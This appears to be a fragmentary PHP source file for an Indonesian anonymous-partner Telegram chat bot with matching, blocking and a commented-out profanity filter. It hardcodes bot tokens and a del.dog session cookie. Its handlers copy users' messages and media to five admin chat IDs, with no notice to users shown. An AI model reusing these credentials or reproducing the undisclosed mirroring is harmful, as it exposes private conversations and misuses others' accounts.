...
$token = '1415222711:AAFC-UYwfdHiqclsSc0egK3iNk7s4SJXDtE';
...
// User Mengecek Chat Id Masing Masing
if(preg_match("/\/mychatid/", $text)){
$mes = "Chat id kamu adalah $chat_id";
...
$getfile = file_get_contents("block.json");
$decode = json_decode($getfile, true);
...
$text = "Terduga adanya pelanggaran

Silahkan hubungi @hamura_id
Untuk membuka akses ke bot ini
...
/*
		// Block User Otomatis
// Menambah Kata Kotor (Hanya Admin)
if(preg_match("/\/addword/i", $text)){
if ($chat_id == 696907598){
$kata = explode('/addword ', $text);
$kata = $kata[1];
$kk = file_get_contents("https://del.dog/raw/katakotor");
$kk = rawurldecode($kk);
$kk = json_decode($kk, true);
$aas = array();
foreach ($kk as $kkt){
$aas[] = $kkt;
} // foreach
$aas[] = $kata;
$enn = json_encode($aas, JSON_PRETTY_PRINT);
$en = rawurlencode($enn);
$headers[] = "content-type: application/json; charset=UTF-8";
$headers[] = "cookie: doggie_session=ffaf389591326607%2F550b2da74cc48f0fd6b08fe6d8d642e17a939fecab27ce16fac972fcdc9907a8";
$data = '{"content":"'.$en.'","slug":"katakotor"}';
$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, "https://del.dog/documents?frontend=true");
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
...
} // if pregmatch addword
*/



/*
// Ngecek User Untuk Block Otomatis Kata Kotor
$kk = file_get_contents("https://del.dog/raw/katakotor");
$kk = rawurldecode($kk);
$kk = json_decode($kk, true);

foreach ($kk as $kkt){
if(preg_match("/$kkt/i", $text)){
$mes = "Terdeteksi Kata-kata Kotor/Vulgar
Pesan Kamu Tidak Akan Terkirim
Jika Mengandung Kata-kata Kotor/Vulgar
Mohon Untuk Lebih Bijak Memilih Kata-kata";
$mes = rawurlencode($mes);
$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, "https://api.telegram.org/bot$token/sendMessage?chat_id=$chat_id&text=$mes");
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);
...
$ab = explode('/', $text);
$ab = explode(' ', $ab[1]);
$ab = explode("/$ab[0] ", $text);


$id = $ab[1];

$file = file_get_contents("block.json");
...
$ids[] = $id;
$b = json_encode($ids, JSON_PRETTY_PRINT);
file_put_contents("block.json", $b);
}
}
// Unblock
...
$mes = "Anda terhenti dari obrolan 🙄🙄
Gunakan /search untuk mencari partner lain";
$mes = rawurlencode($mes);
$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, "https://api.telegram.org/bot$token/sendMessage?chat_id=$chat_id&text=$mes");
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);
...
$mes = "Kamu sedang berada di dalam percakapan
...
$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, "https://api.telegram.org/bot1188667423:AAEHy0823tiVoMKs1haIBmlNvpSeRGEmQGc/sendMessage?chat_id=930925552&text=$message1");
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
$result = curl_exec($ch);
...
/*
if (preg_match("/\/findboy/i", $text)){
$gender = 2;
}if (preg_match("/\/findgirl/i", $text)){
$gender = 1;
...
$fa = "boy.json";
$fl = "girl.json";
$aku = file_get_contents("boy.json");
$lawan = file_get_contents("girl.json");
}elseif ($gender == 2){
$gender = "Perempuan";
$fa = "girl.json";
$fl = "boy.json";
$aku = file_get_contents("girl.json");
$lawan = file_get_contents("boy.json");
}

$aku = json_decode($aku, true);
$lawan = json_decode($lawan, true);

// Antisipasi Adanya Bug
$lb = array();
foreach ($aku as $l){
$tunggu12[] = $l;
}
...
$result = curl_exec($ch);
$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, "https://api.telegram.org/bot$token/sendMessage?chat_id=$lb[0]&text=$mes");
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
$result = curl_exec($ch);

// Menghapus Chat Id Aku Dan Lawan Dari Json Penungguan
// Hapus Lawan
foreach ($lawan as $l){
if ($lb[0] == $l){
}else{
...
// Memasukkan ke boy.json dan girl.json
$en1 = json_encode($lawanb, JSON_PRETTY_PRINT);
$en2 = json_encode($akub, JSON_PRETTY_PRINT);
file_put_contents($fl, $en1);
file_put_contents($fa, $en2);

// Memasukkan ke user1.json dan user2.json
$en1 = json_encode($users1, JSON_PRETTY_PRINT);
$en2 = json_encode($users2, JSON_PRETTY_PRINT);
...
$text";
$message1 = rawurlencode($message1);
$AdminChatId[] = '1182894195';
$AdminChatId[] = '1154033158';
$AdminChatId[] = '657537143';
$AdminChatId[] = '517277654';
$AdminChatId[] = '1414821897';
foreach ($AdminChatId as $admin){
$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, "https://api.telegram.org/bot$token/sendMessage?chat_id=$admin&text=$message1");
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
$result = curl_exec($ch);
}
...
$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, "https://api.telegram.org/bot$token/sendSticker?chat_id=$admin&sticker=$file_id");
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
$result = curl_exec($ch);
}
...
$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, "https://api.telegram.org/bot$token/sendVoice?chat_id=$admin&voice=$file_id");
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
$result = curl_exec($ch);
}
...
$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, "https://api.telegram.org/bot$token/sendAudio?chat_id=$admin&audio=$file_id");
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
$result = curl_exec($ch);
}
...
$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, "https://api.telegram.org/bot$token/sendVideo?chat_id=$admin&video=$file_id&caption=$caption");
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
$result = curl_exec($ch);
}
...
$result = curl_exec($ch);
	...
	foreach ($AdminChatId as $admin){
$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, "https://api.telegram.org/bot$token/sendVideo?chat_id=$admin&video=$file_id");
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
$result = curl_exec($ch);
}
...
foreach ($AdminChatId as $admin){
$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, "https://api.telegram.org/bot$token/sendPhoto?chat_id=$admin&photo=$file_id&caption=$caption");
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
$result = curl_exec($ch);
}
...
$result = curl_exec($ch);
	...
	foreach ($AdminChatId as $admin){
$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, "https://api.telegram.org/bot$token/sendPhoto?chat_id=$admin&photo=$file_id");
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
$result = curl_exec($ch);
}
